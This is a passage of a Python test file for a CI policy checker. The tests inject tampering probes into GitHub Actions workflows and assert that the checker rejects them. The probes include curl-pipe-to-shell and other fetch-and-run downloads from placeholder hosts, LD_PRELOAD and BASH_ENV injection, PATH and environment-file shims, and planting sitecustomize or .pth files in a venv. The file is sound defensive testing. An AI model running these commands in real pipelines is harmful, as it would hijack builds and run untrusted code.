                      ('ci', 'python between re-check and verifier', lambda d: steps(d, 'ci-required').insert(-1, {'run': 'python -c "print(1)"'})),
                      ('copilot-code-review', 'Copilot re-check removed', lambda d: steps(d, 'copilot-setup-steps').pop(index(d, python_env.CHECK_COMMAND, 'copilot-setup-steps'))),
                      ('copilot-code-review', 'Copilot GITHUB_PATH shim', lambda d: steps(d, 'copilot-setup-steps').append({'run': 'echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"'}))]
        for name, label, change in mutations:
            with self.subTest(mutation=label):
                self.mutate(name, change)
                self.assertTrue(check_policy.check(self.root), label)
                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
        self.assertEqual(check_policy.check(self.root), [])

    def test_project_settings_cannot_let_pnpm_download_pnpm_or_node(self):
        import json as json_module
        self.assertEqual(check_policy.check(self.root), [])
        manifest_path = self.root / 'console/package.json'
        manifest = manifest_path.read_text()
        data = json_module.loads(manifest)
        for label, dev_engines, expected in (
                ('runtime download', {'runtime': {'name': 'node', 'version': '24.21.0', 'onFail': 'download'}}, 'devEngines.runtime'),
                ('runtime verified only', {'runtime': {'name': 'node', 'version': '24.21.0', 'onFail': 'error'}}, 'devEngines.runtime can download Node'),
                ('package manager download', {'packageManager': {'name': 'pnpm', 'version': '11.17.0', 'onFail': 'download'}}, 'onFail must be error')):
            with self.subTest(case=label):
                manifest_path.write_text(json_module.dumps({**data, 'devEngines': dev_engines}))
                errors = check_policy.check(self.root)
                manifest_path.write_text(manifest)
                self.assertTrue(any(expected in e for e in errors), errors)
        workspace = self.root / 'console/pnpm-workspace.yaml'
        settings = workspace.read_text()
        for line in ('pmOnFail: download', 'managePackageManagerVersions: true', 'useNodeVersion: 24.20.0'):
            with self.subTest(setting=line):
                workspace.write_text(settings + line + '\n')
                errors = check_policy.check(self.root)
                workspace.write_text(settings)
                self.assertTrue(any('console/pnpm-workspace.yaml' in e for e in errors), line)
        workspace.write_text(settings + 'pmOnFail: error\n')
        self.assertEqual(check_policy.check(self.root), [])
        workspace.write_text(settings)

    def test_bootstrap_admission_mutations_are_rejected(self):
        self.assertEqual(check_policy.check(self.root), [])
        def admitted(data, jid):
            return next(s for s in data['jobs'][jid]['steps'] if s.get('run') == check_policy.BOOTSTRAP_COMMAND)
        def evidence(data, jid):
            return next(s for s in data['jobs'][jid]['steps'] if s.get('run') == check_policy.EVIDENCE_COMMAND)
        def move_after_fresh_go(data):
            steps = data['jobs']['validate']['steps']
            step = admitted(data, 'validate'); steps.remove(step)
            steps.insert(next(i for i, s in enumerate(steps) if s.get('run') == check_policy.GO_FRESH) + 1, step)
        setup_go = {'uses': 'actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e', 'with': {'go-version-file': 'server/go.mod', 'cache': 'false'}}
        mutations = [
            ('server', 'missing bootstrap', lambda d: d['jobs']['validate']['steps'].remove(admitted(d, 'validate')), 'exactly one admitted bootstrap'),
            ('server', 'setup-go', lambda d: d['jobs']['validate']['steps'].insert(1, dict(setup_go)), 'unchecked setup action'),
            ('agent', 'rustup', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'rustup toolchain install 1.99.0 --profile minimal'}), 'unchecked download'),
            ('console', 'playwright install', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'pnpm exec playwright install --with-deps chromium firefox webkit'}), 'unchecked download'),
            ('console', 'curl pipe', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'curl -fsSL https://example.invalid/tool.sh | sh'}), 'unchecked download'),
            ('console', 'setup-node', lambda d: d['jobs']['validate']['steps'].insert(1, {'uses': 'actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1', 'with': {'node-version-file': 'console/.node-version'}}), 'unchecked setup action'),
            ('console', 'omit playwright', lambda d: admitted(d, 'validate')['env'].update(CI_TOOLS='python,node,pnpm'), 'bootstrap tools omit playwright'),
            ('server', 'omit go', lambda d: admitted(d, 'validate')['env'].update(CI_TOOLS='python'), 'bootstrap tools omit go'),
            ('server', 'tools from PR text', lambda d: admitted(d, 'validate')['env'].update(CI_TOOLS='${{ github.event.pull_request.title }}'), 'CI_TOOLS must be a literal'),
            ('server', 'foreign platform', lambda d: admitted(d, 'validate')['env'].update(CI_PLATFORM='windows-x64'), 'CI_PLATFORM must come from the fixed runner matrix'),
            ('server', 'platform from PR text', lambda d: admitted(d, 'loader-gate-a')['env'].update(CI_PLATFORM='${{ github.head_ref }}'), 'CI_PLATFORM must come from the fixed runner matrix'),
            ('server', 'sources cache mode', lambda d: admitted(d, 'validate').update(run=check_policy.BOOTSTRAP_COMMAND.replace('--cache-mode none', '--cache-mode sources')), 'missing exact bootstrap command'),
            ('server', 'conditional bootstrap', lambda d: admitted(d, 'validate').update({'if': 'false'}), 'bootstrap step must be unconditional'),
            ('server', 'bootstrap after consumer', move_after_fresh_go, 'bootstrap must precede every step except checkout'),
            ('server', 'missing evidence', lambda d: d['jobs']['validate']['steps'].remove(evidence(d, 'validate')), 'evidence step must follow'),
            ('server', 'job env tools', lambda d: d['jobs']['validate'].update(env={'CI_TOOLS': 'python,go'}), 'bootstrap inputs must be literal step env'),
            ('bootstrap', 'missing controls', lambda d: d['jobs']['validate']['steps'].remove(next(s for s in d['jobs']['validate']['steps'] if s.get('run') == check_policy.CONTROLS_COMMAND)), 'corruption controls must precede'),
            ('bootstrap', 'controls after install', lambda d: d['jobs']['validate']['steps'].insert(4, d['jobs']['validate']['steps'].pop(1)), 'corruption controls must precede'),
            ('bootstrap', 'removed matrix tools', lambda d: d['jobs']['validate']['strategy']['matrix']['include'][0].update(tools='python,go'), 'must select every lock tool for its host'),
            # The bootstrap's GITHUB_ENV write is admitted only in its exact shape; nothing else may redirect admitted tools.
            ('ci', 'bootstrap also writing GITHUB_PATH', lambda d: admitted(d, 'route').update(run=check_policy.BOOTSTRAP_COMMAND + ' --path-out "$GITHUB_PATH"'), 'missing exact bootstrap command'),
            ('design', 'second GITHUB_ENV writer in a closure consumer', lambda d: d['jobs']['validate']['steps'].insert(4, {'shell': python_env.ADMISSION_SHELL, 'working-directory': '.', 'run': 'cat "$RUNNER_TEMP/other.env" >> "$GITHUB_ENV"'}), 'environment writes outside the fresh cache helper and admitted bootstrap'),
            ('server', 'PATH override through GITHUB_ENV', lambda d: d['jobs']['fuzz']['steps'].insert(4, {'run': 'echo "PATH=$RUNNER_TEMP/shim:$PATH" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('server', 'RUSTC override through GITHUB_ENV', lambda d: d['jobs']['fuzz']['steps'].insert(4, {'run': 'printf "RUSTC=%s\\n" /usr/bin/rustc >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('server', 'GITHUB_PATH shim outside a closure consumer', lambda d: d['jobs']['fuzz']['steps'].insert(4, {'run': 'echo "$RUNNER_TEMP/shim" >> "$GITHUB_PATH"'}), 'PATH changes outside the admitted bootstrap'),
            ('server', 'step PATH env', lambda d: d['jobs']['race']['steps'][-3].setdefault('env', {}).update(PATH='/opt/hostedtoolcache/go/1.27.1/x64/bin'), 'admitted tool environment override'),
            ('console', 'job browser path', lambda d: d['jobs']['validate'].update(env={'PLAYWRIGHT_BROWSERS_PATH': '/home/runner/.cache/ms-playwright'}), 'admitted tool environment override'),
            ('agent', 'workflow toolchain override', lambda d: d.update(env={'RUSTUP_TOOLCHAIN': 'stable'}), 'admitted tool environment override'),
            # The review's accepted probes (R-13) and the admitted environment file (R-15).
            ('bootstrap', 'browsers dropped from the Linux row', lambda d: d['jobs']['validate']['strategy']['matrix']['include'][0].update(tools='python,go,rust'), 'must select every lock tool'),
            ('bootstrap', 'Rust dropped from the macOS row', lambda d: d['jobs']['validate']['strategy']['matrix']['include'][2].update(tools='python,go'), 'must select every lock tool'),
            ('console', 'pnpm dlx', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': 'pnpm dlx some-tool@1.0.0'}), 'unchecked download'),
            ('console', 'gh release download', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': 'gh release download v1 -R owner/tool'}), 'unchecked download'),
            ('console', 'python urlretrieve', lambda d: d['jobs']['validate']['steps'].insert(5, {'shell': python_env.ADMISSION_SHELL, 'run': 'python -c "import urllib.request; urllib.request.urlretrieve(\'https://x.invalid/t\', \'t\')"'}), 'unchecked download'),
            ('console', 'pnpm pm-on-fail download', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': 'pnpm install --frozen-lockfile --pm-on-fail=download'}), 'unchecked download'),
            ('server', 'LD_PRELOAD job env', lambda d: d['jobs']['validate'].update(env={'LD_PRELOAD': '/tmp/hook.so'}), 'admitted tool environment override forbidden: LD_PRELOAD'),
            ('console', 'NODE_OPTIONS job env', lambda d: d['jobs']['validate']['env'].update(NODE_OPTIONS='--require /tmp/hook.js'), 'admitted tool environment override forbidden: NODE_OPTIONS'),
            ('console', 'pnpm setting through env', lambda d: d['jobs']['validate']['env'].update(pnpm_config_pm_on_fail='download'), 'admitted tool environment override forbidden: pnpm_config_pm_on_fail'),
            ('console', 'pnpm setting through GITHUB_ENV', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': 'echo "pnpm_config_pm_on_fail=download" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('server', 'environment file not applied', lambda d: d['jobs']['validate']['steps'].pop(2), 'the exact admitted environment step must directly follow'),
            ('server', 'environment file applied twice', lambda d: d['jobs']['validate']['steps'].insert(6, dict(d['jobs']['validate']['steps'][2])), 'the exact admitted environment step'),
            # Confirmation review N-04: disguised writes and downloads.
            ('server', 'split-string GOROOT write', lambda d: d['jobs']['fuzz']['steps'].insert(5, {'run': 'echo "GO""ROOT=/opt/go" >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('server', 'escaped GOROOT write', lambda d: d['jobs']['fuzz']['steps'].insert(5, {'run': 'echo GO\\ROOT=/opt/go >> "$GITHUB_ENV"'}), 'admitted tool environment override'),
            ('agent', 'PowerShell WebClient', lambda d: d['jobs']['validate']['steps'].insert(5, {'shell': 'pwsh', 'run': '(New-Object Net.WebClient).DownloadFile("https://x.invalid/t.zip", "t.zip")'}), 'unchecked download'),
            ('agent', 'PowerShell iwr', lambda d: d['jobs']['validate']['steps'].insert(5, {'shell': 'pwsh', 'run': 'iwr https://x.invalid/t.zip -OutFile t.zip'}), 'unchecked download'),
            ('console', 'node https fetch', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': "node -e \"require('https').get('https://x.invalid/t', r => r.pipe(process.stdout))\""}), 'unchecked download'),
            ('console', 'node global fetch', lambda d: d['jobs']['validate']['steps'].insert(5, {'run': "node -e \"fetch('https://x.invalid/t').then(r => r.text())\""}), 'unchecked download'),
            ('server', 'environment file rewritten', lambda d: d['jobs']['validate']['steps'].insert(3, {'run': 'echo "GOROOT=/opt/go" >> "$RUNNER_TEMP/tools.env"'}), 'written and applied only by its exact steps'),
        ]
        for name, label, change, expected in mutations:
            with self.subTest(mutation=label):
                self.mutate(name, change)
                errors = check_policy.check(self.root)
                self.assertTrue(any(expected in error for error in errors), (label, errors))
                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
        self.assertEqual(check_policy.check(self.root), [])
        # Parsing a URL is not a download: a plain urllib.parse step stays admissible (N-04 false positive).
        self.mutate('console', lambda d: d['jobs']['validate']['steps'].insert(5, {'shell': python_env.ADMISSION_SHELL, 'run': 'python -c "import urllib.parse; print(urllib.parse.quote(\'a b\'))"'}))
        self.assertEqual(check_policy.check(self.root), [])
        shutil.copyfile(ROOT / '.github/workflows/console.yml', self.root / '.github/workflows/console.yml')
        lock = self.root / 'scripts/ci/toolchains.lock.json'
        baseline = lock.read_text()
        mac = '"url": "https://static.rust-lang.org/dist/2026-10-01/rustc-1.99.0-aarch64-apple-darwin.tar.gz"'
        for label, text in (('macOS payload needing lzma', baseline.replace(mac, mac.replace('.tar.gz', '.tar.xz'))),
                            ('tampered digest', baseline.replace('63d339f0da5ab53635a56f2490a7984dfe12dfcff22ad749f63edaf590168445', 'f' * 64)),
                            ('http mirror', baseline.replace('https://go.dev/dl/go1.27.1.linux-amd64.tar.gz', 'http://go.dev/dl/go1.27.1.linux-amd64.tar.gz')),
                            ('removed Windows Go', baseline.replace('"id": "go-1.27.1-windows-x64"', '"id": "go-1.27.1-windows-x64", "mirror": "x"'))):
            with self.subTest(lock=label):
                lock.write_text(text)
                self.assertTrue(any('toolchains.lock.json' in error for error in check_policy.check(self.root)), label)
        lock.write_text(baseline)
        self.assertEqual(check_policy.check(self.root), [])

    def test_runner_file_environment_and_receipt_adjacency_probes_are_rejected(self):
        """A-08 and A-10: context-named runner files, expression or shell start-up environments, and any step
        between the terminal re-check and the receipt."""
        import python_env
        self.assertEqual(check_policy.check(self.root), [])
        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
        def index(data, run, jid='validate'): return next(i for i, s in enumerate(steps(data, jid)) if s.get('run') == run)
        def insert_after(run, step, jid='validate'):
            return lambda data: steps(data, jid).insert(index(data, run, jid) + 1, step)
        def validator(data): return next(s for s in steps(data) if 'schemas/policy/v1alpha1/validate.py' in s.get('run', ''))
        def set_env(scope, env):
            def change(data):
                target = data if scope == 'workflow' else data['jobs']['validate'] if scope == 'job' else validator(data)
                target['env'] = env
            return change
        install, check = python_env.INSTALL_COMMAND, python_env.CHECK_COMMAND
        expression = '${{ fromJSON(\'{"PYTHONPATH":"vendor"}\') }}'
        mutations = [
            ('design', 'N01 github.path', insert_after(install, {'run': 'echo "$RUNNER_TEMP/v2/bin" >> "${{ github.path }}"'})),
            ('design', 'N02 github.env', insert_after(install, {'run': 'echo "PYTHONPATH=$PWD/vendor" >> "${{ github.env }}"'})),
            ('design', 'mixed-case context', insert_after(install, {'run': 'echo dir >> "${{ GitHub.Path }}"'})),
            ('design', 'indexed context', insert_after(install, {'run': 'echo dir >> "${{ github[\'path\'] }}"'})),
            ('design', 'whole context', insert_after(install, {'run': 'echo dir >> "${{ fromJSON(toJSON(github)).path }}"'})),
            ('design', 'action input', insert_after(install, {'uses': 'example/writer@' + 'a' * 40, 'with': {'file': '${{ github.env }}'}})),
            ('design', 'job env carrying the path file', lambda d: d['jobs']['validate'].setdefault('env', {}).update(HOST_OS='${{ github.path }}')),
            ('design', 'BASH_ENV through GITHUB_ENV', insert_after(install, {'run': 'echo "BASH_ENV=$PWD/x.sh" >> "$GITHUB_ENV"'})),
            ('design', 'N05 copy into venv', insert_after(install, {'run': 'cp -r schemas/vendor/jsonschema "$RUNNER_TEMP/validator/lib/python3.14/site-packages/"'})),
            ('design', 'N06 pth into venv', insert_after(install, {'run': 'printf \'import os\\n\' > "${{ runner.temp }}/validator/lib/python3.14/site-packages/zz.pth"'})),
            ('design', 'admission step environment', lambda d: steps(d)[index(d, check)].update(env={'HOST_OS': 'x'})),
            ('design', 'admission step plain bash', lambda d: steps(d)[index(d, check)].update(shell='bash')),
            ('design', 'install step plain bash', lambda d: steps(d)[index(d, install)].update(shell='bash')),
        ]
        for scope in ('workflow', 'job', 'step'):
            mutations.append(('design', f'N03/N04 {scope} env expression', set_env(scope, expression)))
            for key in ('BASH_ENV', 'ENV', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'BASH_FUNC_python%%', 'PERL5OPT'):
                mutations.append(('design', f'{scope} {key}', set_env(scope, {key: 'scripts/ci/fixtures/shell-env.sh'})))
        mutations += [
            ('design', 'N07 python3 after re-check', insert_after(check, {'run': 'python3 schemas/policy/v1alpha1/validate.py'})),
            ('design', 'N08 shell python after re-check', insert_after(check, {'shell': 'python {0}', 'run': 'import runpy\nrunpy.run_path("schemas/policy/v1alpha1/validate.py")\n'})),
            ('design', 'N09 installer shell', insert_after(install, {'shell': 'python -m pip install -r {0}', 'run': 'evil @ https://example.invalid/evil-1.0-py3-none-any.whl'})),
            ('design', 'action between re-check and receipt', insert_after(check, {'uses': 'example/tool@' + 'a' * 40})),
            ('design', 'shell step between re-check and receipt', insert_after(check, {'run': 'true'})),
            ('ci', 'copy and PATH between aggregate re-check and verifier', insert_after(check, {
                'run': 'cp -a "$RUNNER_TEMP/validator" "$RUNNER_TEMP/v2" && echo "$RUNNER_TEMP/v2/bin" >> "${{ github.path }}"'}, 'ci-required')),
            ('ci', 'ci-contracts step between re-check and receipt', insert_after(check, {'run': 'true'}, 'ci-contracts')),
            ('bootstrap', 'bootstrap step between re-check and receipt', insert_after(check, {'shell': python_env.ADMISSION_SHELL, 'run': 'python3 -c 1'})),
            ('copilot-code-review', 'Copilot step after re-check', lambda d: steps(d, 'copilot-setup-steps').append({'run': 'python3 -c 1'})),
        ]
        for name, label, change in mutations:
            with self.subTest(mutation=label):
                self.mutate(name, change)
                self.assertTrue(check_policy.check(self.root), label)
                shutil.copyfile(ROOT / f'.github/workflows/{name}.yml', self.root / f'.github/workflows/{name}.yml')
        self.assertEqual(check_policy.check(self.root), [])

    def test_shell_environment_and_venv_spelling_probes_are_rejected(self):
        """A-12 and A-14: per-command environment in run scripts and shells, and other spellings of the venv,
        site-packages, base interpreter and runner file commands (review probes V01 to V19)."""
        import python_env
        self.assertEqual(check_policy.check(self.root), [])
        def steps(data, jid='validate'): return data['jobs'][jid]['steps']
        def validator(data): return next(s for s in steps(data) if 'schemas/policy/v1alpha1/validate.py' in s.get('run', ''))
        def proof(data): return next(s for s in steps(data) if s.get('id') == 'proof')
        def after_install(run):
            def change(data):
                index = next(i for i, s in enumerate(steps(data)) if s.get('run') == python_env.INSTALL_COMMAND)
                steps(data).insert(index + 1, {'run': run})
            return change
        def prefix_validator(text):
            return lambda d: validator(d).update(run=validator(d)['run'].replace(
                'python schemas/policy/v1alpha1/validate.py\n', text + 'python schemas/policy/v1alpha1/validate.py\n'))
        probes = [
            ('V01 absolute venv path', after_install('cp -r vendor/jsonschema /home/runner/work/_temp/validator/lib/python3.14/site-packages/')),
            ('V02 dot-dot venv path', after_install('cp -r vendor/jsonschema "$RUNNER_TEMP/../_temp/validator/lib/python3.14/site-packages/"')),
            ('V03 glob venv path', after_install('cp -r vendor/jsonschema "$RUNNER_TEMP"/valid*/lib/python3.14/site-packages/')),
            ('V03b other glob', after_install('cp -r vendor/jsonschema "$RUNNER_TEMP"/v?lidator/lib/')),
            ('V04 computed site-packages', after_install('SP=$(python -c \'import sysconfig; print(sysconfig.get_path("purelib"))\')\ncp -r vendor/jsonschema "$SP/"')),
            ('V05 runner PATH file glob', after_install('echo "$RUNNER_TEMP/v2/bin" >> "$RUNNER_TEMP"/_runner_file_commands/add_path_*')),
            ('V06 runner env file glob', after_install('echo "LD_LIBRARY_PATH=$PWD/lib" >> "$RUNNER_TEMP"/_runner_file_commands/set_env_*')),
            ('V07 sitecustomize via pythonLocation', after_install('printf \'import atexit\\n\' > "$pythonLocation/lib/python3.14/sitecustomize.py"')),
            ('V08 inline PYTHONPATH', prefix_validator('PYTHONPATH=vendor ')),
            ('V09 export PYTHONPATH', prefix_validator('export PYTHONPATH=vendor\n')),
            ('V10 env prefix', prefix_validator('env PYTHONPATH=vendor ')),
            ('V11 env custom shell', lambda d: validator(d).update(shell='env PYTHONPATH=vendor bash -e {0}')),
            ('V12 inline PYTHONPATH in the proof step', lambda d: proof(d).update(run='PYTHONPATH=vendor python3 schemas/policy/v1alpha1/validate.py\n' + proof(d)['run'])),
            ('V13 bash shim through a computed path', after_install('cp /bin/true "$(dirname "$(command -v python)")/bash"')),
            ('V14 python wrapper through a computed path', after_install('B="$(dirname "$(which python)")"; cp wrapper.sh "$B/python"')),
            ('V18 pth through a glob', after_install('printf \'import atexit\\n\' > "$(echo "$RUNNER_TEMP"/valid*)/lib/python3.14/site-packages/zz.pth"')),
            ('V19 escaped installer then inline PYTHONPATH', prefix_validator('python -m pi\\p install --target vendor jsonschema\nPYTHONPATH=vendor ')),
            ('declare -x', prefix_validator('declare -x PYTHONPATH=vendor\n')),
            ('export of an earlier assignment', prefix_validator('export PYTHONSTARTUP\n')),
            ('set -a before sourcing', prefix_validator('set -a\n. ./vars.sh\n')),
            ('set -o allexport', prefix_validator('set -o allexport\n')),
            ('inline BASH_ENV', prefix_validator('BASH_ENV=./x.sh bash -c true\n')),
            ('inline LD_PRELOAD', prefix_validator('LD_PRELOAD=./x.so ')),
            ('inline DYLD_INSERT_LIBRARIES', prefix_validator('DYLD_INSERT_LIBRARIES=./x.dylib ')),
            ('inline PATH', prefix_validator('PATH="$PWD/shim:$PATH" ')),
            ('lower-case pythonpath', prefix_validator('pythonpath=vendor ')),
            ('PIP_ assignment', prefix_validator('PIP_INDEX_URL=https://example.invalid/simple ')),
            ('python custom shell', lambda d: validator(d).update(shell='python {0}')),
            ('job default shell', lambda d: d['jobs']['validate'].update(defaults={'run': {'shell': 'env PYTHONPATH=vendor bash -e {0}'}})),
            ('workflow default shell', lambda d: d.update(defaults={'run': {'shell': 'sh -e {0}'}})),
            ('toolcache path', after_install('cp sitecustomize.py /opt/hostedtoolcache/Python/3.14.8/x64/lib/python3.14/')),
            # M-01: the patterns run over raw step strings, so a token at a line start, after a tab or after a continuation counts.
            ('E01 venv after a continuation', after_install('cd "$RUNNER_TEMP" && cp /bin/true \\\nvalidator/bin/bash')),
            ('E02 venv after a tab', after_install('cd "$RUNNER_TEMP" && cp /bin/true\tvalidator/bin/bash')),
            ('E03b which on a second line', after_install('echo locate\nwhich python > "$RUNNER_TEMP/p"\ncp /bin/true "$RUNNER_TEMP/bash"')),
            ('E04b type -P on a second line', after_install('echo locate\ntype -P python > "$RUNNER_TEMP/p"\ncp /bin/true "$RUNNER_TEMP/bash"')),
            ('E05b command -v on a second line', after_install('echo locate\ncommand -v python > "$RUNNER_TEMP/p"\ncp /bin/true "$RUNNER_TEMP/bash"')),
            ('E20 heredoc line starting with sys.executable', after_install(
                "python - <<'PY'\nimport os, shutil, sys\nhere = os.path.dirname(\nsys.executable)\nshutil.copy('/bin/true', os.path.join(here, 'bash'))\nPY\n")),
        ]
        for label, change in probes:
            with self.subTest(probe=label):
                self.mutate('design', change)
                self.assertTrue(check_policy.check(self.root), label)
                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')
        # Controls: the admitted interpreter toggles, display names and ordinary script names stay accepted.
        for label, change in (('PYTHONDONTWRITEBYTECODE inline', prefix_validator('PYTHONDONTWRITEBYTECODE=1 ')),
                              ('validator in a step name', lambda d: validator(d).update(name='Validate with the validator venv')),
                              ('validate.py scripts', prefix_validator('python schemas/export/v1alpha1/validate.py\n'))):
            with self.subTest(control=label):
                self.mutate('design', change)
                self.assertEqual(check_policy.check(self.root), [], label)
                shutil.copyfile(ROOT / '.github/workflows/design.yml', self.root / '.github/workflows/design.yml')

    def test_windows_runner_selection(self):
        jobs = (
            {'runs-on': 'windows-2025'},
            {'runs-on': '${{ matrix.os }}', 'strategy': {'matrix': {'os': ['ubuntu-24.04', 'windows-2025']}}},
            {'runs-on': '${{ matrix.os }}', 'strategy': {'matrix': {'include': [{'os': 'windows-2025'}]}}},
            {'runs-on': '${{ matrix.host }}', 'strategy': {'matrix': {'host': ['windows-2025']}}},
            {'runs-on': '${{ matrix.os }}', 'strategy': {'matrix': '${{ fromJSON(needs.route.outputs.matrix) }}'}},
            {'runs-on': '${{ inputs.runner }}'},
        )
        for job in jobs:
            with self.subTest(job=job): self.assertTrue(check_policy.windows_rows(job))
        for job in ({'runs-on': 'ubuntu-24.04'}, {'runs-on': '${{ matrix.os }}',
                    'strategy': {'matrix': {'os': ['ubuntu-24.04', 'macos-15']}}}):
            with self.subTest(job=job): self.assertFalse(check_policy.windows_rows(job))

    def test_windows_run_steps_require_explicit_shell(self):
        commands = ("python - <<'123'\nprint('fixture')\n123",
                    "python - <<'END-PY'\nprint('fixture')\nEND-PY",
                    '[ -n "$RUNNER_TEMP" ]', 'FIXTURE=1', 'python --version')
        for command in commands:
            with self.subTest(command=command):
                def change(data):
                    job = data['jobs']['validate']
                    job.get('defaults', {}).get('run', {}).pop('shell', None)
                    for step in job['steps']:
                        if 'run' in step and 'shell' not in step: step['shell'] = 'bash'
                    job['steps'].insert(-1, {'name': 'Isolated shell control', 'run': command})
                self.mutate('bootstrap', change)
                self.assertTrue(any('Windows run step requires an explicit shell' in error
                                    for error in check_policy.check(self.root)))
                shutil.copyfile(ROOT / '.github/workflows/bootstrap.yml',
                                self.root / '.github/workflows/bootstrap.yml')

    def test_windows_shell_defaults_and_overrides(self):
        # The agent job has Windows rows and is not a closure consumer, whose shells are limited to bash.
        for scope in ('step', 'job'):
            for shell in (python_env.ADMISSION_SHELL,):
                with self.subTest(scope=scope, shell=shell):
                    def change(data):
                        job = data['jobs']['validate']
                        job.get('defaults', {}).get('run', {}).pop('shell', None)
                        for step in job['steps']:
                            if 'run' in step and 'shell' not in step: step['shell'] = 'bash'
                        step = {'name': 'Explicit shell control', 'run': 'python --version'}
                        if scope == 'step': step['shell'] = shell
                        else: job['defaults'] = {'run': {'shell': shell}}
                        job['steps'].insert(-1, step)
                    self.mutate('agent', change)
                    self.assertEqual(check_policy.check(self.root), [])
                    shutil.copyfile(ROOT / '.github/workflows/agent.yml',
                                    self.root / '.github/workflows/agent.yml')
        def workflow_default_only(data):
            job = data['jobs']['validate']
            job.get('defaults', {}).get('run', {}).pop('shell', None)
            for step in job['steps']:
                if 'run' in step and 'shell' not in step: step['shell'] = 'bash'
            data['defaults'] = {'run': {'shell': python_env.ADMISSION_SHELL}}
            job['steps'].insert(-1, {'run': 'python --version'})
        self.mutate('agent', workflow_default_only)
        self.assertTrue(any('Windows run step requires an explicit shell' in error
                            for error in check_policy.check(self.root)))

    def test_verifier_command_is_exact(self):
        command = ('python -B scripts/ci/required.py --route "$RUNNER_TEMP/route.json" '
                   '--needs "$RUNNER_TEMP/needs.json" --receipts "$RUNNER_TEMP/ci-receipts"')
        mutations = ('# ' + command, 'if false; then\n' + command + '\nfi',
                     command + ' || true', command + '\n', 'echo fixture\n' + command)
        for run in mutations:
            with self.subTest(run=run):
                self.mutate('ci', lambda data: data['jobs']['ci-required']['steps'][-1].update(run=run))
                self.assertTrue(any('exact fixed verifier command' in error
                                    for error in check_policy.check(self.root)))
                shutil.copyfile(ROOT / '.github/workflows/ci.yml', self.root / '.github/workflows/ci.yml')

    def test_verifier_rejects_shell_overrides_at_every_level(self):
        for scope in ('step', 'job', 'workflow'):
            for shell in ('bash -c "exit 0" {0}', 'pwsh', 'sh', 'bash {0}', '', None):
                with self.subTest(scope=scope, shell=shell):
                    def change(data):
                        job = data['jobs']['ci-required']
                        if scope == 'step': job['steps'][-1]['shell'] = shell
                        elif scope == 'job': job['defaults'] = {'run': {'shell': shell}}
                        else: data['defaults'] = {'run': {'shell': shell}}
                    self.mutate('ci', change)
                    self.assertTrue(any('verifier shell must be literal bash' in error
                                        for error in check_policy.check(self.root)))
                    shutil.copyfile(ROOT / '.github/workflows/ci.yml',
                                    self.root / '.github/workflows/ci.yml')

    def test_verifier_allows_only_bash_or_absent_shell_defaults(self):
        for step_shell in (False, True):
            for job_shell in (False, True):
                for workflow_shell in (False, True):
                    with self.subTest(step=step_shell, job=job_shell, workflow=workflow_shell):
                        def change(data):
                            job = data['jobs']['ci-required']
                            job['steps'][-1].pop('shell', None)
                            if step_shell: job['steps'][-1]['shell'] = python_env.ADMISSION_SHELL
                            if job_shell: job['defaults'] = {'run': {'shell': python_env.ADMISSION_SHELL}}
                            if workflow_shell: data['defaults'] = {'run': {'shell': python_env.ADMISSION_SHELL}}
                        self.mutate('ci', change)
                        errors = check_policy.check(self.root)
                        if not (step_shell or job_shell or workflow_shell):
                            self.assertTrue(any('admission shell' in e for e in errors), errors)
                        else:
                            self.assertEqual(errors, [])
                        shutil.copyfile(ROOT / '.github/workflows/ci.yml',
                                        self.root / '.github/workflows/ci.yml')

    def test_aggregate_verifier_is_unconditional_and_terminal(self):
        def move_before_downloads(data):
            steps = data['jobs']['ci-required']['steps']
            verifier = steps.pop()
            download = next(i for i, step in enumerate(steps)
                            if step.get('uses', '').startswith('actions/download-artifact@'))
            steps.insert(download, verifier)
        mutations = (
            lambda d: d['jobs']['ci-required']['steps'][-1].update({'if': 'false'}),
            lambda d: d['jobs']['ci-required']['steps'][-1].update({'if': '${{ false }}'}),
            lambda d: d['jobs']['ci-required']['steps'][-1].update({'continue-on-error': 'true'}),
            move_before_downloads,
        )
        for change in mutations:
            with self.subTest(mutation=change):
                self.mutate('ci', change)
                self.assertTrue(any('unconditional terminal verifier' in error or 'exact fixed verifier command' in error
                                    for error in check_policy.check(self.root)))
                shutil.copyfile(ROOT / '.github/workflows/ci.yml',
                                self.root / '.github/workflows/ci.yml')

    def test_receipts_matrix_callers_and_permissions(self):
        changes = [
            ('ci', lambda d: d['jobs']['ci-required']['needs'].remove('server')),
            ('ci', lambda d: d['jobs']['ci-required'].pop('if')),
            ('ci', lambda d: d['on']['push'].update(paths=['docs/**'])),
            ('ci', lambda d: d['jobs']['server'].update(uses='./.github/workflows/server.yml@master')),
            ('agent', lambda d: d['jobs']['validate']['strategy']['matrix']['include'].pop()),
            ('server', lambda d: d['jobs']['loader-gate-a']['strategy']['matrix']['os'].pop()),
            ('server', lambda d: d['jobs']['race']['steps'].pop()),
            ('server', lambda d: d['jobs']['race'].update(**{'continue-on-error': 'true'})),
            ('console', lambda d: d.update(permissions={'contents': 'write'})),
            ('console', lambda d: d['jobs']['validate']['steps'][0]['with'].update(**{'persist-credentials': 'true'})),
            ('bootstrap', lambda d: d['jobs']['validate']['strategy'].update(**{'fail-fast': 'true'})),
        ]
        for name, change in changes:
            with self.subTest(workflow=name):
                self.mutate(name, change)
                self.assertTrue(check_policy.check(self.root))
